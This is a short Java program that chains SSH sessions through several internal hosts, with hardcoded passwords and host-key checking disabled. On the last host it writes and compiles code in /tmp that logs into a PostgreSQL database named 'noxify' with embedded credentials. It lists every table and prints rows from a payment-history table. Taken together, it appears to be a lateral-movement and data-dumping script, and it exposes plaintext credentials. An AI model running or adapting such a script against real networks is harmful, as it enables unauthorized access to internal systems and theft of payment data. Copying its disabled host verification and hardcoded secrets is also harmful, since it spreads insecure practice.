import com.jcraft.jsch.*;
import java.io.*;
class FR4 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s1 = j.getSession("user", "10.14.36.23", 22);
    s1.setPassword("kutul0nc4t");
    s1.setConfig(p);
    s1.setTimeout(10000);
    s1.connect();
    int fwd1 = s1.setPortForwardingL(0, "10.13.16.117", 22);
    Session s2 = j.getSession("user", "127.0.0.1", fwd1);
    s2.setPassword("kutul0nc4t");
    s2.setConfig(p);
    s2.setTimeout(8000);
    s2.connect();
    ChannelExec ch = (ChannelExec) s2.openChannel("exec");
    // Noxify DB - query online_payment_history for xendit platform calls
    // Also check ALL Noxify DB tables
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.196 'cd /tmp;echo \"import java.sql.*;class FD{public static void main(String[] a)throws Exception{Class.forName(\\\"org.postgresql.Driver\\\");Connection c=DriverManager.getConnection(\\\"jdbc:postgresql://10.13.17.248:5501/noxify\\\",\\\"noxify\\\",\\\"cZskyJqqE7?7V_8=#Ed^\\\");System.out.println(\\\"NOXIFY CONNECTED\\\");Statement s=c.createStatement();System.out.println(\\\"---ALL-TABLES---\\\");ResultSet r=s.executeQuery(\\\"SELECT tablename FROM pg_tables WHERE schemaname=\\\\\\\"public\\\\\\\" ORDER BY tablename\\\");while(r.next())System.out.println(r.getString(1));System.out.println(\\\"---ONLINE-PAYMENT-SAMPLE---\\\");r=s.executeQuery(\\\"SELECT * FROM online_payment_history ORDER BY id DESC LIMIT 2\\\");ResultSetMetaData md=r.getMetaData();for(int i=1;i<=md.getColumnCount();i++)System.out.print(md.getColumnName(i)+\\\"|\\\");System.out.println();while(r.next()){for(int i=1;i<=md.getColumnCount();i++){String v=r.getString(i);System.out.print((v!=null?v.substring(0,Math.min(100,v.length())):\\\"null\\\")+\\\"|\\\");}System.out.println();}c.close();}}\" > FD.java;/usr/lib/jvm/java-1.8.0-amazon-corretto/bin/javac -cp /progs/neo/neo-app/tomcat/8.0.53/webapps/neo/ROOT/WEB-INF/lib/postgresql-42.3.3.jar FD.java 2>&1;/usr/lib/jvm/java-1.8.0-amazon-corretto/bin/java -cp /progs/neo/neo-app/tomcat/8.0.53/webapps/neo/ROOT/WEB-INF/lib/postgresql-42.3.3.jar:. FD 2>&1' 2>&1 | head -40");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[16384];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s2.disconnect();
    s1.disconnect();
  }
}
